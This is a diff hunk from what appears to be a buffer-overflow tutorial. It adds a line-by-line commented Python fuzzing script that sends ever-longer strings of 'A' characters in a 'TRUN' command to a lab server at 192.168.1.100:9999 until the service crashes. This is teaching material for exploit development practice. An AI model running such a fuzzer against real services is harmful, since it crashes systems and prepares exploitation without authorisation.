@@ -256,6 +256,38 @@ while True:
                 sys.exit()
 ```
 
+- You can call it something like: `l.py`
+
+    - I will comment it line by line:
+
+```python
+# We declare we are using python:
+#!/usr/bin/python
+
+# We import sys & socket modules, so we can pull specific IPv4 & Port
+# For example, for using "socket" & "connect" commands
+import sys, socket
+
+# We import from sleep module, only the "time" command
+# We will use it for wait 1 second "sleep(1)"
+from time import sleep
+
+buffer = "A" * 100
+
+while True:
+        try:
+                s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+                s.connect(('192.168.1.100', 9999))
+                
+                s.send(('TRUN /.:/' + buffer))
+                s.close()
+                sleep(1)
+                buffer = buffer + "A"*100
+        
+        except:
+                print "Fuzzing crashed at %s bytes" % str(len(buffer))
+                sys.exit()
+```
 
 
 
